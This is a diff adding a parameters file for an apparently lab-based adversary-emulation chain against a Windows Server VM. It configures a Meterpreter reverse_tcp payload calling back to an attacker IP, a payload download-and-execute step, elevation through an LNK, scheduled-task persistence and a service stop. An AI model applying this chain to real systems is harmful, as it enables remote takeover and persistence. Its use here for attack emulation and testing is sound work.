@@ -1,0 +1,86 @@
+# Aurora attack-chain parameters file — chain-002-fixed (env0)
+#
+# Chain narrative:
+#   msfvenom Meterpreter EXE → victim downloads and runs (non-elev)
+#   → Meterpreter session 1 (medium) → meterpreter-arp (Discovery) →
+#   victim RE-runs same EXE as Admin via LNK-root → Meterpreter session 2
+#   (elevated) → meterpreter-execute derives cmd from elevated session
+#   → schtasks-at-time persistence (elevated cmd) → net-stop-service
+#   impact (elevated cmd).
+#
+#   Original chain-002 had art-t1003_002-esentutl-vss-sam-copy credential
+#   dump + downstream meterpreter-download; both removed in -fixed after
+#   parking the VSS-family actions on 2026-07-13. Chain is now 10 steps
+#   instead of 12; loses the T1003.002 credential-access tactic marker
+#   but the initial-access → discovery → priv-esc (via LNK-root
+#   re-execute) → persistence → impact arc stays fully intact.
+#   See NOTES.txt and emulation_plan_details.manual_edits.
+#
+# Attacker: Kali at 192.168.56.43 with msfconsole running
+# Victim:   Windows Server 2022 VM, RDP as useradmin
+#           (medium-integrity split token — NOT built-in Administrator,
+#            NOT SSH — see chain-003-fixed pilot 2026-07-16 for full
+#            setup rationale)
+
+pddl_bindings:
+  # used by: 1_msfvenom-1.SAVE_PATH
+  # Attacker-side path where msfvenom writes the Meterpreter EXE.
+  string0_var_in_plan: /home/kali/Desktop/Aurora-executor-demo/msf_save/chain_mp.exe
+
+  # used by: 3_simulate-download-execute-file.SAVE_PATH,
+  #          6_simulate-execute-lnk-windows-root.EXE_PATH
+  # Victim-side landing path — downloaded at step 3, then re-executed
+  # elevated via LNK-root at step 6. Same file threaded through.
+  string1_var_in_plan: C:\Users\Public\chain_mp.exe
+
+  # used by: 9_art-t1053_005-schtasks-at-time.task_command
+  # Command line the scheduled task fires at `task_time`. Notepad is
+  # a benign / always-present binary that verifies the schtasks
+  # mechanism (task created + schedule wired) without depending on
+  # the msfvenom payload staying resident. A real attacker chain
+  # would point this at their persistence payload staged in a
+  # different location. Kept spaces-free — sliver.py's _dequote
+  # preprocessor won't strip it (only applies to Sliver transport,
+  # this step runs via Meterpreter shell), but keeping paths simple
+  # sidesteps any residual quoting quirks across backends.
+  string3_var_in_plan: C:\Windows\System32\notepad.exe
+
+steps:
+  "1_msfvenom-1":
+    LHOST: 192.168.56.43       # attacker IP baked into Meterpreter payload
+    LPORT: 4444                # must match handler LPORT in step 2
+
+  "2_set-msf-payload-handler-for-file":
+    LHOST: 192.168.56.43                            # match step 1 LHOST
+    LPORT: 4444                                     # match step 1 LPORT
+    payload_name: windows/meterpreter/reverse_tcp   # match msfvenom -p in step 1
+
+  "3_simulate-download-execute-file":
+    LHOST: 192.168.56.43       # attacker's HTTP server IP
+    LPORT: 8000                # `python -m http.server 8000` on Kali
+
+  "8_meterpreter-execute":
+    Commands: cmd.exe          # spawn a plain shell — the derived
+                               # Command Prompt executor at step 8 runs
+                               # schtasks (step 9) + net.exe (step 10)
+                               # under this cmd, inheriting the elevated
+                               # integrity of the step-7 Meterpreter parent
+
+  "9_art-t1053_005-schtasks-at-time":
+    task_name: 'AuroraChainPersist'   # human-visible task name for
+                                      # later manual verification via
+                                      # `schtasks /query /tn AuroraChainPersist`
+    task_time: '23:59'                # HH:MM local time — pushed
+                                      # comfortably into the future so
+                                      # schtasks doesn't reject as
+                                      # already-passed. NB the action's
+                                      # default value `1210` is missing
+                                      # the required colon — that's an
+                                      # action-YAML bug to fix in art-v2
+                                      # post-pilot (schtasks needs HH:MM).
+
+  "10_art-t1489-net-stop-service":
+    service_name: 'spooler'    # Print Spooler — safe target, always
+                               # present on Server 2022, stopping it is
+                               # non-destructive (services get restarted
+                               # trivially). ART canonical choice.
